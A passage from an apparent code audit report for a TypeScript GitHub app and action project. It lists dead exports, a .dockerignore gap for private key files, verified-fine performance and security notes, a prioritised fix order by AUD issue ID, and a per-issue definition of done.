- **`.dockerignore`** — does not exclude `*.pem` / `private-key.pem`; the builder stage `COPY . .` (`Dockerfile:53`) would include a stray key in build context/cache. Add `**/*.pem`, `private-key.pem`, `*.key`.
- **`lib/src/mcp/servers.ts:83`** — `exampleRemoteServer()` exported, never used. Remove.
- **`lib/src/utils/platform-logger.ts:426`** — `createGitHubActionsPlatformLogger()` exported, never called. Remove (not re-exported from `lib/src/index.ts`).
- **`lib/src/utils/validation.ts:48`** — `validateProgramArgs` exported but only used internally at :151; make module-private.
- **`lib/src/pattern-detector/minhash-optimized.ts`** — `computeMinHashSignatureArray`, `lshCandidatesTyped` exported but unused; trim exports (module itself is used via `cluster.ts:1`).
- **`docker-compose.yml`** M9 note — curl not installed in runtime image (only builder, `Dockerfile:16`); needed for healthcheck (AUD-028).
- **Status:** [ ] Open

---

## Performance notes that are fine (verified — do not "fix")

- JSONL output parsing is streamed (`jsonl-parser.ts:57-65`, readline over `createReadStream`), not load-all.
- `runOpenCode` output capture is capped at 50KB (`opencode.ts:1401-1421`).
- Shallow `--depth 1` clones in the app (`commands.ts:86-98`) are correct; blame degrades gracefully.
- `CodebaseIndexCache` eviction and `LoggingSubscriber` rotation bound disk growth.
- Retry usage is consistent — every raw `fetch` in `lib/src` is inside `withRetry` (though the variants `withRetry` / `withRetryAndTimeout` / private `fetchWithRetry` could be consolidated — see AUD-016 spirit).
- `any` usage is effectively zero (5 matches, all in comments) — the no-`any` convention is fully enforced; keep it as a review rule.
- Webhook HMAC is verified by Probot; git execution uses `execFile`/array args everywhere (no shell injection); no `eval`/`new Function` anywhere.
- Docker multi-stage build, non-root user (uid 10001), pinned/checksummed opencode binary, digest-pinned base images — all correct.

---

## Suggested execution order

| Order | Issue IDs | Effort | Why now |
|---|---|---|---|
| 1 | AUD-001, AUD-002, AUD-003 | S-M | Data-loss/security/downtime; small diffs |
| 2 | AUD-005, AUD-006, AUD-017 | M | Blocks/hangs on the hot path; bounded diffs |
| 3 | AUD-011, AUD-012, AUD-013, AUD-020 | S | Quick reliability wins in the store + compose |
| 4 | AUD-004, AUD-022, AUD-023, AUD-024, AUD-028 | M | Durability + deploy safety |
| 5 | AUD-007, AUD-008, AUD-009, AUD-026, AUD-025 | M-L | Security hardening (needs design) |
| 6 | AUD-010, AUD-014, AUD-015, AUD-016, AUD-018, AUD-019, AUD-021 | L | Performance + maintainability debt |
| 7 | AUD-027, AUD-029 through AUD-036 | S | Hygiene / docs |

---

## Definition of Done (per issue)

- [ ] Code change implemented
- [ ] `pnpm lint` passes
- [ ] `pnpm typecheck` passes
- [ ] `pnpm test` passes
- [ ] `pnpm build` passes (mandatory after any `lib/src` change — action/app consume lib)
- [ ] Relevant tests added or updated
- [ ] Commit references the AUD-### ID in the message
